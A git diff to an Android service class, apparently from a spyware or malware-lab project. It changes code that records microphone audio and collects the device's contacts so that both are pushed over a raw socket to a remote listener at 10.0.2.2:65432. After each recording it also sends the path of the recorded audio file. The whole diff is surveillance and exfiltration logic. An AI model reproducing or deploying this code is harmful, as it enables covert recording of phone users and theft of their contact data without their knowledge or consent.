@@ -29,6 +29,7 @@ public class MyService extends Service {
     private ResultReceiver resultReceiver;
 
     Looper myLooper;
+    String outputFile;
     ServiceHandler myHandler;
 
     public MyService() {
@@ -134,20 +135,18 @@ public class MyService extends Service {
             throw new RuntimeException(e);
         }
 
-        new Thread(() -> {
-            try {
-                sendDataToServer();
-                Log.d("Network", "Successfully sent contacts to server.");
-            } catch (IOException e) {
-                Log.e("Network", "Failed to send data to server.", e);
-            }
-        }).start();
+        try {
+            sendDataToServer(true);
+            Log.d("Network", "Successfully sent contacts to server.");
+        } catch (IOException e) {
+            Log.e("Network", "Failed to send data to server.", e);
+        }
     }
 
     private void recordAudio() {
         String storagePath = this.getExternalFilesDir(null).getAbsolutePath();
         String fName = "/audio_" + System.currentTimeMillis() + ".3gp";
-        String outputFile = storagePath + fName;
+        outputFile = storagePath + fName;
         MediaRecorder rec = new MediaRecorder();
         rec.setAudioSource(MediaRecorder.AudioSource.MIC);
         rec.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
@@ -166,13 +165,24 @@ public class MyService extends Service {
         }
         rec.stop();
         rec.release();
+
+        try {
+            sendDataToServer(false);
+            Log.d("Network", "Successfully sent contacts to server.");
+        } catch (IOException e) {
+            Log.e("Network", "Failed to send data to server.", e);
+        }
     }
 
-    private void sendDataToServer() throws IOException {
+    private void sendDataToServer(boolean isContact) throws IOException {
         Socket server = new Socket("10.0.2.2", 65432);
         DataOutputStream dout = new DataOutputStream(server.getOutputStream());
 
-        dout.writeUTF(contactsList.toString());
+        if (isContact) {
+            dout.writeUTF(contactsList.toString());
+        } else {
+            dout.writeUTF(outputFile);
+        }
         dout.flush();
         dout.writeUTF("disconnecting");
         dout.flush();
